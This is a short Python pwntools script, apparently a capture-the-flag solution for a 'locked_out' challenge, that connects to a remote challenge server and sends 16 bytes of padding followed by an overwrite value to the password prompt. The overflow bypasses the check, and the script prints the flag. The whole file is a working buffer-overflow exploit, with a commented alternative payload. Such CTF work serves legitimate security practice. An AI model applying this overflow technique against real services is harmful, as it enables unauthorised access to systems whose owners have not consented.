from pwn import *

# context.log_level = 'debug'
# r = process("./locked_out")
r = remote("challenge.magpiectf.ca", 7329)

r.recvuntil(b"Password: ")
# r.sendline(b"a"*16+p64(0x2a))
r.sendline(b"a"*16+b"give_abcde_flag")
r.recvuntil(b"Here is your reward for helping me!\n")
flag = r.recvline()
print(f"flag: {flag}")